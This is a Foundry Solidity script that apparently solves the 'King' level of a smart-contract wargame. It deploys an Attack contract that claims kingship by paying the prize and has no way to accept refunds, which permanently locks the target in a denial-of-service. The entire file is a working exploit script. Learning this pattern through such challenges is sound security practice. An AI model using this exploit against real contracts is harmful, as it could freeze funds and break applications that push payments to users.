// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/King-09.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Attack {
    constructor(address payable _kingContract) payable {
        _kingContract.call{value: King(_kingContract).prize()}("");
    }
}

contract KingSolution is Script {
    King public king = King(payable(0x620ba916830CE57d05a0C2bc68Ff23400D3a0174));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("Old King", king._king());
        
        new Attack{value: king.prize()}(payable(king));

        console.log("New King", king._king());
        console.log("My Address", vm.envAddress("MY_ADDRESS"));
        console.log("new prize", king.prize());
        vm.stopBroadcast();
    }
}
